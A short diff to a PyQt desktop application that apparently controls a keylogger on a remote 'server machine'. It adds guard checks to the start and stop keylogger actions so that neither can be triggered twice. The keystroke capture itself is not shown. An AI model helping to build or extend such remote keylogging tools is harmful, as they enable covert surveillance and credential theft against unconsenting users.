@@ -298,6 +298,9 @@ class Window(QMainWindow, Ui_MainWindow):
 
     @pyqtSlot()
     def on_action_Start_KeyLogger_triggered(self):
+        if self.keyLogger is not None:
+            return
+
         self.cmdQueue.append(["Start KeyLogger"])
         self.keyLogger = open(dirname(__file__) + r"\logger.txt", 'w')
         self.logger.info("starting keylogger on the server machine")
@@ -305,6 +308,9 @@ class Window(QMainWindow, Ui_MainWindow):
 
     @pyqtSlot()
     def on_action_Stop_KeyLogger_triggered(self):
+        if self.keyLogger is None:
+            return
+
         self.cmdQueue.append(["Stop KeyLogger"])
         self.keyLogger.close()
         self.keyLogger = None
